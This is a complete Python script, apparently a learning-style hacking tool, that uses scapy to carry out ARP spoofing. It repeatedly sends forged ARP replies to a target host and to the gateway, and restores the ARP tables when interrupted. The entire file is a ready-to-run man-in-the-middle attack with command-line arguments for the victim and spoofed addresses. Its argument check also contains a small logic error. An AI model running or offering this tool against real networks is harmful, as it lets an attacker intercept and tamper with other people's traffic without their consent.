import logging
import sys
import time
import scapy.all as scapy
import argparse
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_packet = broadcast / arp_request
        answered, unanswered = scapy.srp(arp_request_packet,timeout = 1,verbose=False)

        return answered[0][1].hwsrc
    except IndexError:
        print("[-] Please enter existing ip address in the network and make sure of the parameters")
        sys.exit()
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=False)

def restore(destination_ip,source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="TARGET_IP_ADDRESS", help="IP Address for the target")
    parser.add_argument("-s", "--spoof", dest="SPOOF_IP_ADDRESS", help="IP Address for spoofing")
    options = parser.parse_args()
    if not options.TARGET_IP_ADDRESS and options.SPOOF_IP_ADDRESS:
        parser.error("[-] Please specify the IP addresses, use --help for more info.")
    else:
        return options.TARGET_IP_ADDRESS,options.SPOOF_IP_ADDRESS
target_ip,gateway_ip = get_arguments()
try:
    sent_packets_count = 0
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        sent_packets_count+=2
        print(f"\r[+] Packets sent: {sent_packets_count}",end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ... Resetting ARP tables ... Please wait.")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)